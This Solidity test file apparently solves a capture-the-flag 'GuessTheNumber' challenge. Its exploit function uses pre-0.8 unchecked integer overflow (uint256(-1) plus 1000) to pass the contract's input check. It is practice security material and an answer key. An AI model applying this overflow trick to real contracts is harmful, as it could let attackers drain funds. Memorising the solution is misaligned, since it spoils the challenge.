// SPDX-License-Identifier: Unlicense
pragma solidity ^0.7.6;
pragma abicoder v2;

import "./utils/BaseTest.sol";

import "src/math/GuessTheNumberChallenge.sol";

contract TestGuessTheNumber is BaseTest {
    GuessTheNumberChallenge private challenge;

    address private player;

    constructor() {
        // Created (during `setUp()`) users will be available in `users` state variable

        string[] memory userLabels = new string[](1);
        userLabels[0] = "Player";
        preSetUp(userLabels.length, 100 ether, userLabels);
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();

        challenge = new GuessTheNumberChallenge();
        player = users[0];
    }

    function testExploit() public {
        runTest();
    }

    function exploit() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player);

        // We will exploit the contract leveraging the fact that it uses a solidity version < v0.8
        // Before solidity v0.8 contracts won't revert for math under/overflow
        uint256 b = uint256(-1);
        uint256 a = b + 1000;
        challenge.input(a, b);

        vm.stopPrank();
    }

    function success() internal override {
        /** SUCCESS CONDITIONS */

        assertEq(challenge.isSolved(), true);
    }
}
